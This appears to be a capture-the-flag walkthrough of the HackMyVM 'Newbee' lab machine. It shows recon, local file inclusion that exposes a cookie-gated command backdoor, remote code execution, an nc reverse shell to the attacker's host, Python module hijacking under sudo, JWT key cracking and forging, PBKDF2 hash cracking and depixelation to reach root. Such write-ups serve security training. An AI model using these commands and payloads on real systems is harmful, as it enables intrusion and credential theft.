# Newbee

## Recon

::: info Note
Machine is only **VMWare**
:::

```bash
└─$ ip -brief a s eth1
eth1             UP             192.168.56.107/24 fe80::71bf:96a0:ead8:6cc/64

└─$ fping -ag 192.168.56.0/24 2> /dev/null
192.168.56.100
192.168.56.107
192.168.56.108
```

::: details nmap_scan.log
```log
Open 192.168.56.108:22
Open 192.168.56.108:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 192.168.56.108

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 92:6e:6d:b0:bd:08:1e:db:9d:56:0e:f8:15:25:ca:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiHBCUSVx+hri+uVG02S27DKJTfLyM2fBJhuHs/rPM6YOW1Tq4iqWpPXBEnI+bjQ4Owzvr0jfUUUkCU7iiOZ5Q=
|   256 88:d7:08:bd:a2:95:75:cc:71:06:47:ae:fd:d3:8b:b9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7KWNM+0Qv1fjHiH3wnqdPOJhJrel1v3Sz+xKGEcV8s
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-title: PHPJabbers.com | Free Food Store Website Template
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/newbee/writeup.png)

### Fuzzing

```bash
└─$ feroxbuster -u http://newbee.hmv -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 275
200      GET      100l      187w     2420c http://newbee.hmv/assets/js/custom.js
200      GET      377l     1267w    18852c http://newbee.hmv/index.php
200      GET      179l      450w     7907c http://newbee.hmv/testimonials.php
200      GET      209l      639w     9782c http://newbee.hmv/blog.php
200      GET        7l      662w    58078c http://newbee.hmv/assets/js/bootstrap.min.js
200      GET       18l      930w    89048c http://newbee.hmv/assets/js/mixitup.js
200      GET    16582l    60225w   485937c http://newbee.hmv/assets/js/accordions.js
200      GET      193l      779w    10036c http://newbee.hmv/about.php
301      GET        9l       28w      309c http://newbee.hmv/assets => http://newbee.hmv/assets/
200      GET      236l      713w    11829c http://newbee.hmv/blog-details.php
200      GET      216l      475w     8853c http://newbee.hmv/contact.php
200      GET      303l      570w    13307c http://newbee.hmv/checkout.php
200      GET        1l      233w    19796c http://newbee.hmv/assets/js/imgfix.min.js
200      GET        2l       89w     4572c http://newbee.hmv/assets/js/scrollreveal.min.js
200      GET        8l      165w     8051c http://newbee.hmv/assets/js/waypoints.min.js
200      GET      262l      565w    10887c http://newbee.hmv/product-details.php
200      GET      282l      659w    12163c http://newbee.hmv/products.php
200      GET     2445l    10688w    83672c http://newbee.hmv/assets/js/popper.js
200      GET        4l     1304w    83617c http://newbee.hmv/assets/js/jquery-2.1.0.min.js
200      GET      155l      460w     6670c http://newbee.hmv/terms.php
200      GET        8l       36w     1074c http://newbee.hmv/assets/js/jquery.counterup.min.js
200      GET      377l     1267w    18852c http://newbee.hmv/
301      GET        9l       28w      313c http://newbee.hmv/javascript => http://newbee.hmv/javascript/
200      GET       90l      161w     2187c http://newbee.hmv/secret.php
```

![writeup-1.png](/assets/pentest/hackmyvm/newbee/writeup-1.png)

Nothing from fuzzing
```bash
└─$ ffuf -u 'http://newbee.hmv/secret.php?command=id&FUZZ=admin&admin=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 2187
```

The website has general content, nothing eye catching. No more secret files or directories. No login page, passwords or anything related to active users, all data is dummy data. There are a lot of comments in HTML, maybe scavenge something?

```bash
└─$ for page in index testimonials blog about blog-details contact checkout product-details products terms secret; do curl "http://newbee.hmv/$page.php" -s | grep '<!--'; done | awk '{$1=$1};1' | sort | uniq -c | sort -nr
  ...
      1 <!--Wrong paramter to GET-->
  ...
```

Hmmm... more fuzzing probably for `secret.php`

Hmm nothing again
```bash
└─$ ffuf -u 'http://newbee.hmv/secret.php?FUZZ=id' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -fs 2187
```

After tracking down the comment location it's from `index.php`... HMMMMMM
```bash
└─$ ffuf -u 'http://newbee.hmv/?FUZZ=id' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -fs 18852
hack                    [Status: 200, Size: 18864, Words: 6832, Lines: 377, Duration: 11ms]
```

### LFI

[https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#phpfilter](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#phpfilter)

Only `secret.php` read was allowed.
```bash
└─$ curl -s 'http://newbee.hmv/' -G --data-urlencode 'hack=id' | tail -1
<!-- include failed try another file --> 

└─$ curl -s 'http://newbee.hmv/' -G --data-urlencode 'hack=php://filter/convert.base64-encode/resource=secret.php'  | tail -1
PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDx0aXRsZT7lkb3ku6TooYzmjqfliLblj7A8L3RpdGxlPg0KICAgIDxzdHlsZT4NCiAgICAgICAgYm9keSB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUxZTFlOw0KICAgICAgICAgICAgZm9udC1mYW1pbHk6IENvbnNvbGFzLCBtb25vc3BhY2U7DQogICAgICAgICAgICBjb2xvcjogI2ZmZjsNCiAgICAgICAgICAgIG1hcmdpbjogMDsNCiAgICAgICAgICAgIHBhZGRpbmc6IDA7DQogICAgICAgIH0NCg0KICAgICAgICAuY29uc29sZSB7DQogICAgICAgICAgICB3aWR0aDogODAlOw0KICAgICAgICAgICAgbWFyZ2luOiA1MHB4IGF1dG87DQogICAgICAgICAgICBwYWRkaW5nOiAyMHB4Ow0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsNCiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgNHB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpOw0KICAgICAgICAgICAgaGVpZ2h0OiA0MDBweDsNCiAgICAgICAgICAgIG92ZXJmbG93LXk6IGF1dG87DQogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7DQogICAgICAgIH0NCg0KICAgICAgICAub3V0cHV0IHsNCiAgICAgICAgICAgIHdoaXRlLXNwYWNlOiBwcmUtd3JhcDsNCiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDEwcHg7DQogICAgICAgIH0NCg0KICAgICAgICAuaW5wdXQtY29udGFpbmVyIHsNCiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7DQogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICAgICB9DQoNCiAgICAgICAgLmlucHV0LWNvbnRhaW5lciAucHJvbXB0IHsNCiAgICAgICAgICAgIGNvbG9yOiAjMDBmZjAwOw0KICAgICAgICAgICAgbWFyZ2luLXJpZ2h0OiA1cHg7DQogICAgICAgIH0NCg0KICAgICAgICAuaW5wdXQtY29udGFpbmVyIGlucHV0IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50Ow0KICAgICAgICAgICAgYm9yZGVyOiBub25lOw0KICAgICAgICAgICAgY29sb3I6ICNmZmY7DQogICAgICAgICAgICB3aWR0aDogMTAwJTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDVweDsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsNCiAgICAgICAgICAgIG91dGxpbmU6IG5vbmU7DQogICAgICAgIH0NCg0KICAgICAgICAuaW5wdXQtY29udGFpbmVyIGlucHV0OmZvY3VzIHsNCiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMwMGZmMDA7DQogICAgICAgIH0NCg0KICAgICAgICAuaW5wdXQtY29udGFpbmVyIGlucHV0OjpwbGFjZWhvbGRlciB7DQogICAgICAgICAgICBjb2xvcjogIzg4ODsNCiAgICAgICAgfQ0KDQogICAgICAgIC5jb25zb2xlLWZvb3RlciB7DQogICAgICAgICAgICBwYWRkaW5nLXRvcDogMTBweDsNCiAgICAgICAgICAgIGNvbG9yOiAjODg4Ow0KICAgICAgICAgICAgZm9udC1zaXplOiAxMnB4Ow0KICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgICAgICB9DQogICAgPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KDQo8ZGl2IGNsYXNzPSJjb25zb2xlIj4NCiAgICA8ZGl2IGNsYXNzPSJvdXRwdXQiIGlkPSJvdXRwdXQiPg0KICAgICAgICA8P3BocA0KDQogICAgICAgIGlmIChpc3NldCgkX0NPT0tJRVsnQXJlWW91QWRtaW4nXSkgJiYgJF9DT09LSUVbJ0FyZVlvdUFkbWluJ10gPT09ICdZZXMnKSB7DQoNCiAgICAgICAgICAgIGlmIChpc3NldCgkX0dFVFsnY29tbWFuZCddKSkgew0KICAgICAgICAgICAgICAgICRjb21tYW5kID0gJF9HRVRbJ2NvbW1hbmQnXTsNCiAgICAgICAgICAgICAgICAkb3V0cHV0ID0gc2hlbGxfZXhlYygkY29tbWFuZCk7DQogICAgICAgICAgICAgICAgZWNobyAnPGRpdj5cPiAnIC4gaHRtbHNwZWNpYWxjaGFycygkY29tbWFuZCkgLiAnPC9kaXY+JzsNCiAgICAgICAgICAgICAgICBlY2hvICc8ZGl2PicgLiBubDJicihodG1sc3BlY2lhbGNoYXJzKCRvdXRwdXQpKSAuICc8L2Rpdj4nOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZWNobyAnPGRpdj5ObyBwZXJtaXNzaW9uIHRvIGV4ZWN1dGUgY29tbWFuZHMsIGxhY2tpbmcgYWRtaW4gcGVybWlzc2lvbi48L2Rpdj4nOw0KICAgICAgICB9DQogICAgICAgID8+DQogICAgPC9kaXY+DQoNCiAgICA8ZGl2IGNsYXNzPSJpbnB1dC1jb250YWluZXIiPg0KICAgICAgICA8c3BhbiBjbGFzcz0icHJvbXB0Ij5cPjwvc3Bhbj4NCiAgICAgICAgPGZvcm0gbWV0aG9kPSJnZXQiPg0KICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIGlkPSJpbnB1dCIgcGxhY2Vob2xkZXI9ImNvbW1hbmQuLi4iIGF1dG9jb21wbGV0ZT0ib2ZmIj4NCiAgICAgICAgPC9mb3JtPg0KICAgIDwvZGl2Pg0KPC9kaXY+DQoNCjxzY3JpcHQ+DQogICAgY29uc3QgaW5wdXRGaWVsZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpbnB1dCIpOw0KDQogICAgaW5wdXRGaWVsZC5mb2N1cygpOw0KPC9zY3JpcHQ+DQoNCjwvYm9keT4NCjwvaHRtbD4NCg==<!-- include failed try another file -->                                                                                                                                                                                                            
└─$ curl -s 'http://newbee.hmv/' -G --data-urlencode 'hack=php://filter/convert.base64-encode/resource=secret.php'  | tail -1 | grep -o '.*==' | base64 -d
...
        <?php
        if (isset($_COOKIE['AreYouAdmin']) && $_COOKIE['AreYouAdmin'] === 'Yes') {
            if (isset($_GET['command'])) {
                $command = $_GET['command'];
                $output = shell_exec($command);
                echo '<div>\> ' . htmlspecialchars($command) . '</div>';
                echo '<div>' . nl2br(htmlspecialchars($output)) . '</div>';
            }
        } else {
            echo '<div>No permission to execute commands, lacking admin permission.</div>';
        }
...
```

### RCE

```bash
└─$ rce() { curl -s 'http://newbee.hmv/secret.php' -b 'AreYouAdmin=Yes' -G --data-urlencode "command=$1" | htmlq '#output > div:nth-child(2)' -t }
└─$ rce id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

```bash
└─$ rce 'nc 192.168.56.107 4444 -e /bin/bash'
---
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.56.107] from (UNKNOWN) [192.168.56.108] 40272
script /dev/null -qc/bin/bash
www-data@Newbee:/var/www/html/shop$ ^Z
zsh: suspended  nc -lvnp 4444

└─$ stty raw -echo;fg;
[1]  + continued  nc -lvnp 4444

www-data@Newbee:/var/www/html/shop$ export TERM=xterm
```

There's another internal application running
```bash
www-data@Newbee:/var/www/html/flask$ ls -lAhR
.:
total 8.0K
-rwx--x--x 1 root root 2.3K Mar 25 06:48 main.py
drwxr-xr-x 2 root root 4.0K Mar  7  2025 templates

./templates:
total 8.0K
-rw-r--r-- 1 root root 2.0K Mar  7  2025 board.html
-rw-r--r-- 1 root root 1.8K Mar  7  2025 login.html
www-data@Newbee:/var/www/html/flask$ ss -tunlp4
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
```

There's an odd script named `vuln.py`
```python
www-data@Newbee:/var/www/html$ cat vuln.py
import random
import time
import math
import string
import datetime

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def pointless_computation():
    number = random.randint(1, 1000)
    result = math.sqrt(number) * math.log(number)
    print(f"Calculated math nonsense: sqrt({number}) * log({number}) = {result}")

def simulate_time_wasting():
    now = datetime.datetime.now()
    print(f"Started wasting time at {now}")
    time.sleep(2)  # 故意睡眠 2 秒
    later = datetime.datetime.now()
    print(f"Finished wasting time at {later}. Time wasted: {later - now}")

def pointless_string_operations():
    rand_str = generate_random_string()
    print(f"Generated random string: {rand_str}")
    reversed_str = rand_str[::-1]
    print(f"Reversed string: {reversed_str}")
    print(f"String length: {len(rand_str)}")

if __name__ == "__main__":
    pointless_computation()
    simulate_time_wasting()
    pointless_string_operations()
    print("All done. The script accomplished nothing useful.")
```

If we had to guess the `vuln.py` generated secret key for flask application.
```bash
www-data@Newbee:/var/www/html$ curl 0:5000 -s
...
    <!--
    Todo:My secret key is very simple, I will change it soon.
    -->
...
```

We can execute `vuln.py` as `debian` user
```bash
www-data@Newbee:/var/www/html$ sudo -l
Matching Defaults entries for www-data on Newbee:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    targetpw, use_pty

User www-data may run the following commands on Newbee:
    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py
```

Right.. we don't have write permissions on any global python packages, but module lookup starts from current directory and then goes to global packages directory. But only pure python (e.g.: random), not C extension libraries (e.g.: math).
```bash
www-data@Newbee:/var/www/html$ echo $'import os\nos.system("/bin/bash -p")' > random.py
www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py
sudo: unable to resolve host Newbee: Temporary failure in name resolution
debian@Newbee:/var/www/html$ id
uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

## SSH 

Upgrade reverse shell to SSH access
```bash
└─$ ssh-keygen -f id_rsa -q -P x && cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMy6TFLd7PJ03U/FDHp4U6qs0FMVDpJmh6K8dRZ8U2FR woyag@kraken
---
debian@Newbee:~$ mkdir ~/.ssh
debian@Newbee:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMy6TFLd7PJ03U/FDHp4U6qs0FMVDpJmh6K8dRZ8U2FR woyag@kraken' >> ~/.ssh/authorized_keys

└─$ ssh -i id_rsa debian@newbee.hmv -L 5000:0:5000
debian@Newbee:~$ id
uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

Might as well Port Forward 5000 because we will probably attack  the application.

### User.txt

```bash
debian@Newbee:~$ cat user.txt
ed2b1f468c5f915f3f1cf75d7068baae
```

## Privilege Escalation

```bash
debian@Newbee:~$ find . -type f -ls
  2097161      4 -rw-r--r--   1 debian   debian         94 Sep 11 19:13 ./.ssh/authorized_keys
  2097156      4 -rw-r--r--   1 debian   debian        220 Mar  7  2025 ./.bash_logout
  2097171      4 -rw-r--r--   1 root     root           48 Mar 25 07:56 ./.secret/hint.txt
  2097169      4 -rw-r--r--   1 root     root          758 Mar 25 08:00 ./.secret/password.zip
  2097155      4 -rw-r--r--   1 debian   debian       3526 Jul 11  2023 ./.bashrc
  2097164      4 -rw-r--r--   1 debian   debian         33 Mar  6  2025 ./user.txt
  2097157      0 -rw-r--r--   1 root     root            0 Mar  7  2025 ./.bash_history
  2097167      4 -rw-r--r--   1 root     root          151 Mar  6  2025 ./config.php
  2097154      4 -rw-r--r--   1 debian   debian        807 Jul 11  2023 ./.profile
  2097163      4 -rw-------   1 debian   debian         32 Mar  6  2025 ./.gnupg/pubring.kbx
  2097165      4 -rw-------   1 debian   debian       1200 Mar  6  2025 ./.gnupg/trustdb.gpg
  2097170     12 -rw-------   1 debian   debian       9049 Mar  6  2025 ./.viminfo
  2097160      4 -rw-------   1 debian   debian        119 Mar 25 06:24 ./.mysql_history
  2097166      4 -rw-r--r--   1 root     root          120 Mar  6  2025 ./note.txt
```

```bash
debian@Newbee:~$ cat note.txt
Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me
debian@Newbee:~$ cat .mysql_history
_HiStOrY_V2_
show\040tables;
show\040databases;
select\040*\040from\040user;
use\040user;
select\040*\040from\040user;
debian@Newbee:~$ cat config.php
<?php
$servername = "localhost";
$username = "root";
$password = ""
...
debian@Newbee:~$ cat .secret/hint.txt
password is md5(key)

and key is in mysql!!!!!!
```

Zip is password protected which we have to recover from mysql
```bash
debian@Newbee:/tmp$ cp ~/.secret/password.zip .
debian@Newbee:/tmp$ unzip password.zip
Archive:  password.zip
[password.zip] password.png password:
```

### SQLi

SQL injection is possible on custom application

![writeup-2.png](/assets/pentest/hackmyvm/newbee/writeup-2.png)

Actually nvm that, it's just letting anyone in. But for `admin` it returns wrong password. 

![writeup-3.png](/assets/pentest/hackmyvm/newbee/writeup-3.png)

### JWT Forge

When you login as anyone you're given a cookie
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IngiLCJleHAiOjE3NTc2NDAzNjV9.ohe0VoBVaXdYGj_88MbJ2auv8ZMd6DVo35OejVNDHbU
```

Brute-force it since we know it has a **weak** key
```bash
└─$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IngiLCJleHAiOjE3NTc2NDAzNjV9.ohe0VoBVaXdYGj_88MbJ2auv8ZMd6DVo35OejVNDHbU'
...
Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "x"
[+] exp = 1757640365    ==> TIMESTAMP = 2025-09-12 01:26:05 (UTC)
...
└─$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IngiLCJleHAiOjE3NTc2NDAzNjV9.ohe0VoBVaXdYGj_88MbJ2auv8ZMd6DVo35OejVNDHbU' -C -d /wordlists/rockyou.txt
...
[*] Tested 5 million passwords so far
[+] noob is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "noob"

└─$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IngiLCJleHAiOjE3NTc2NDAzNjV9.ohe0VoBVaXdYGj_88MbJ2auv8ZMd6DVo35OejVNDHbU' -pc username -pv admin -S hs256 -p 'noob' -I
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzU3NjQwMzY1fQ._qdYz541x2shnN0uEcGpOFUhnj7ZmfitY2X8HQ06HyY
```

Edit cookie and uncover passwords

![writeup-4.png](/assets/pentest/hackmyvm/newbee/writeup-4.png)

::: tip Creds
`root:TheStrongestPasswordHYHcreated`
:::

### Zip Password

Yikes **pbdf2**
```bash
debian@Newbee:/tmp$ mysql -u'root' -p'TheStrongestPasswordHYHcreated' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| user               |
+--------------------+
debian@Newbee:/tmp$ mysql -u'root' -p'TheStrongestPasswordHYHcreated' user -e 'SHOW TABLES;'
+----------------+
| Tables_in_user |
+----------------+
| user           |
+----------------+
debian@Newbee:/tmp$ mysql -u'root' -p'TheStrongestPasswordHYHcreated' user -e 'SELECT * FROM user'
+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+
| id | username | passwd                                                                                                                   | salt                             | passwd_hash_algo |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+
|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+
```

[https://hashcat.net/forum/thread-7854.html](https://hashcat.net/forum/thread-7854.html)

```python
from base64 import b64encode

username = 'debian'
password_hash = '2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0'
salt = '8bf3e3452b78544f8bee9400d6936d34' 
iterations = 50500

password_hash = b64encode(bytes.fromhex(password_hash)).decode()
salt = b64encode(bytes.fromhex(salt)).decode()

print(f'{username}:sha256:{iterations}:{salt}:{password_hash}')
```

```bash
└─$ hashcat -a 0 -m 10900 ./hash.txt $rockyou --user
sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx
```

```bash
└─$ echo -n '1qaz2wsx' | md5sum
1c63129ae9db9c60c3e8aa94d3e00495  -

└─$ 7z x password.zip -p'1c63129ae9db9c60c3e8aa94d3e00495'

└─$ open password.png
```

![writeup-5.png](/assets/pentest/hackmyvm/newbee/writeup-5.png)

### Recover Pixelated Image

**[Depixelization_poc](https://github.com/spipm/Depixelization_poc)**: Depix is a PoC for a technique to recover plaintext from pixelized screenshots.

```bash
└─$ git clone https://github.com/spipm/Depixelization_poc.git -q
└─$ cd Depixelization_poc
└─$ py depix.py -p ../password.png -s images/searchimages/debruinseq_notepad_Windows10_spaced.png -o recover.png
```

![writeup-6.png](/assets/pentest/hackmyvm/newbee/writeup-6.png)

```bash
debian@Newbee:/tmp$ echo "Hello from the other side" | timeout 1 su root -c whoami 2>/dev/null
debian@Newbee:/tmp$ echo "hello from the other side" | timeout 1 su root -c whoami 2>/dev/null
debian@Newbee:/tmp$ echo "hellofromtheotherside" | timeout 1 su root -c whoami 2>/dev/null
root
```

::: tip Creds
`root:hellofromtheotherside`
:::

### Root.txt

```bash
root@Newbee:~# cat /root/root.txt
c18b3eff03996f3a203f63733be03d15
```